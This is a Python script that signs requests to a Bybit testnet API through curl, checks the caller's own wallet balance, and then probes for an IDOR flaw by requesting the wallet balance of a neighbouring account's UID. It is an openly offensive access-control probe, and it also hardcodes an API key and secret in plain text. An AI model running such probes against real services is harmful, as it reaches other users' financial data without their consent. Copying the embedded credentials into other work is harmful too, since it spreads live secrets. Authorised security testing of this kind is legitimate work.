#!/usr/bin/env python3
import subprocess
import time
import hmac
import hashlib
import json
import urllib.parse
import sys

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api-testnet.bybit.com"
MY_UID = "527465456"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

# Calculate offset once
SERVER_TIME = get_server_time()
LOCAL_TIME = int(time.time() * 1000)
OFFSET = SERVER_TIME - LOCAL_TIME
print(f"Time offset: {OFFSET}ms")

def get_signature(payload, api_secret):
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(payload, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_request_curl(method, endpoint, payload=None):
    if payload is None:
        payload = {}
        
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "20000"
    
    if method == "GET":
        params_str = "&".join([f"{k}={v}" for k, v in sorted(payload.items())])
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        full_url = f"{BASE_URL}{endpoint}?{params_str}"
    else:
        params_str = json.dumps(payload)
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        full_url = f"{BASE_URL}{endpoint}"
    
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    cmd = ["curl", "-s", "-v"] + headers
    
    if method == "GET":
        cmd.append(full_url)
    else:
        cmd += ["-d", params_str, full_url]
        
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        # Parse JSON from stdout
        try:
            return json.loads(result.stdout)
        except:
            print(f"Raw stdout: {result.stdout[:200]}")
            print(f"Raw stderr: {result.stderr[:200]}")
            return {"retCode": -999, "retMsg": "JSON Parse Error"}
    except Exception as e:
        return {"retCode": -999, "retMsg": str(e)}

print("="*80)
print("CURL-BASED AUTH HUNT")
print("="*80)

# 1. Baseline
print("\n[1] Baseline Check")
res = send_request_curl("GET", "/v5/account/wallet-balance", {"accountType": "UNIFIED"})
print(f"Status: {res.get('retCode')}")
if res.get('retCode') == 0:
    print("✅ Success!")
else:
    print(f"❌ Failed: {res}")
    # If failed, try POST to order create to see if that works
    print("Trying POST...")
    post_res = send_request_curl("POST", "/v5/order/create", {
        "category": "linear",
        "symbol": "BTCUSDT",
        "side": "Buy",
        "orderType": "Limit",
        "qty": "0.001"
    })
    print(f"POST Status: {post_res.get('retCode')} - {post_res.get('retMsg')}")

# 2. IDOR (Only if baseline works)
if res.get('retCode') == 0:
    print("\n[2] Testing IDOR")
    target = str(int(MY_UID) - 1)
    print(f"Targeting UID: {target}")
    
    params = {"accountType": "UNIFIED", "uid": target}
    res_idor = send_request_curl("GET", "/v5/account/wallet-balance", params)
    
    print(f"IDOR Status: {res_idor.get('retCode')}")
    if res_idor.get('retCode') == 0:
        print("Check if response contains target UID...")
        print(str(res_idor)[:200])

print("\n" + "="*80)
